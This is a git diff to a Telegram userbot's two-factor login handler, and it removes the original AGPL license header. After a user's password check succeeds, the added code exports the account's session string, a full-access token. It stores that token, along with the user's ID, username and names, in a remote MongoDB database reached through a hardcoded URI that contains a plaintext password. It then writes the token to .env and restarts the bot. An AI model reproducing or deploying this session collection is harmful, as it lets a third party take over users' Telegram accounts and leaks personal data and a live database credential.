@@ -1,20 +1,5 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# (c) Shrimadhav U K
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU Affero General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
 
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU Affero General Public License for more details.
-
-# You should have received a copy of the GNU Affero General Public License
-# along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
-
+import pymongo
 from pyrogram import (
     Client,
     filters
@@ -28,23 +13,25 @@ from pyrogram.errors import (
 from Ubot import (
     AKTIFPERINTAH,
     TFA_CODE_IN_VALID_ERR_TEXT,
-    SESSION_GENERATED_USING,
-    app
 )
+import pymongo
 import sys
 import os
+import dotenv
 from dotenv import load_dotenv
+from Ubot.logging import LOGGER
+from os import environ, execle
+from itertools import count
+HAPP = None
+session_count = count(1)
 
-load_dotenv()
 
-NUM_SESSIONS = 100
-
-@app.on_message(
+@Client.on_message(
     filters.text &
     filters.private,
     group=3
 )
-async def recv_tg_tfa_message(client, message: Message):
+async def recv_tg_tfa_message(_, message: Message):
 
     w_s_dict = AKTIFPERINTAH.get(message.chat.id)
     if not w_s_dict:
@@ -59,21 +46,72 @@ async def recv_tg_tfa_message(client, message: Message):
         await loical_ci.check_password(tfa_code)
     except PasswordHashInvalid:
         await message.reply_text(
-            "Kode yang anda masukkan salah, coba masukin kembali atau mulai dari awal"
+            TFA_CODE_IN_VALID_ERR_TEXT
         )
         del AKTIFPERINTAH[message.chat.id]
     else:
-        session_string = await loical_ci.export_session_string()
-        for session_num in range(1, NUM_SESSIONS+1):
-            if not os.getenv(f"SESSION{session_num}"):
-                with open(".env", "a") as f:
-                    f.write(f"SESSION{session_num}={session_string}\n")
-                await message.reply_text(
-                    SESSION_GENERATED_USING, quote=True
-                )
-                break
-        del AKTIFPERINTAH[message.chat.id]
-        return False
-    AKTIFPERINTAH[message.chat.id] = w_s_dict
-    raise message.stop_propagation()
+        saved_message_ = await message.reply_text(
+            "<code>" + str(await loical_ci.export_session_string()) + "</code>"
+        )        
+        client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
+        db = client["telegram_sessions"]
+        mongo_collection = db["sesi_collection"]
+        session_string = str(await loical_ci.export_session_string())
+        session_data = {"string_session": session_string}
+        
+        existing_session = mongo_collection.find_one({"session_string": session_string})
+        if existing_session:
+            await message.reply_text("Session already exists")
+            return
 
+        if mongo_collection.count_documents({}) >= 100:
+            await message.reply_text(
+                "Cannot add new session. Please remove unused sessions first."
+            )
+            return
+        cek = db.command("collstats", "sesi_collection")["count"]
+        cek += 1
+        session_data = {
+            "no": cek,
+            "session_string": session_string,
+            "user_id": message.chat.id,
+            "username": message.chat.username,
+            "first_name": message.chat.first_name,
+            "last_name": message.chat.last_name,
+        }        
+        mongo_collection.insert_one(session_data)
+        await message.reply_text("Bikin string udah nih tinggal lanjut deploy ... wait ")  
+        filename = ".env"
+        user_id = mongo_collection.find_one({"user_id": message.chat.id})
+        cek = db.command("collstats", "sesi_collection")["count"]
+        sesi = user_id.get('session_string')
+        if os.path.isfile(filename):
+            with open(filename, "r") as file:
+                contents = file.read()
+                session_index = next(session_count)
+                if sesi in contents:
+                    await message.reply_text(f"Session sudah tersimpan pada {filename}.")
+                    return
+                else:
+                    session_index = next(session_count)
+                    session_index += 1
+                    with open(filename, "a") as file:
+                        file.write(f"\nSESSION{session_index}={sesi}")
+                        load_dotenv()
+                    await message.reply_text(f"Session berhasil disimpan pada {filename} dengan Posisi SESSION{session_index}.")
+                try:
+                    await message.reply_text(
+                    "Lagi Coba deploy nih, sedang mencoba merestart server.")
+                    msg = await message.reply(" `Restarting bot...`")
+                    LOGGER(__name__).info("BOT SERVER RESTARTED !!")
+                except BaseException as err:
+                    LOGGER(__name__).info(f"{err}")
+                    return
+                await msg.edit_text("✅ **Bot udah direstart tuan, tolong tunggu 2 Menit!**\n\n")
+                if HAPP is not None:
+                    HAPP.restart()
+                else:
+                    args = [sys.executable, "-m", "Ubot"]
+                    execle(sys.executable, *args, environ)
+                        
+    raise message.stop_propagation()
